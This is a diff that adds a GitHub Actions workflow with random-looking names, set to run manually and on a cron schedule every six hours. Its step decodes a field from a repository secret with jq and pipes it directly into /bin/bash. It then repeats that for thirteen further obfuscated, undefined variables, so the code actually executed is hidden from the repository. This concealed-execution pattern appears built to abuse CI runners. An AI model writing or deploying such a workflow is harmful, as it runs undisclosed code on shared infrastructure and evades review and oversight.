@@ -1,0 +1,29 @@
+name: dongsihai7651
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongsihai7651
+        env:
+          azfp31065: ${{ secrets.azfp31065 }}
+        run: |
+          echo $azfp31065 | jq -r .qn63486 | /bin/bash
+          echo $rjzh57 | jq -r .nuugk1 | /bin/bash
+          echo $uw6725 | jq -r .w3 | /bin/bash
+          echo $bcd612 | jq -r .zg47 | /bin/bash
+          echo $saqw28 | jq -r .l7703 | /bin/bash
+          echo $mc515 | jq -r .p583 | /bin/bash
+          echo $vhp62 | jq -r .ct42719 | /bin/bash
+          echo $ezi6 | jq -r .ldf23908 | /bin/bash
+          echo $vig914 | jq -r .k7 | /bin/bash
+          echo $zdmu0870 | jq -r .lwky46310 | /bin/bash
+          echo $oct683 | jq -r .whxp609 | /bin/bash
+          echo $leiq8 | jq -r .qb05 | /bin/bash
+          echo $ogs64 | jq -r .th377 | /bin/bash
+          echo $srzt258 | jq -r .p7 | /bin/bash
+
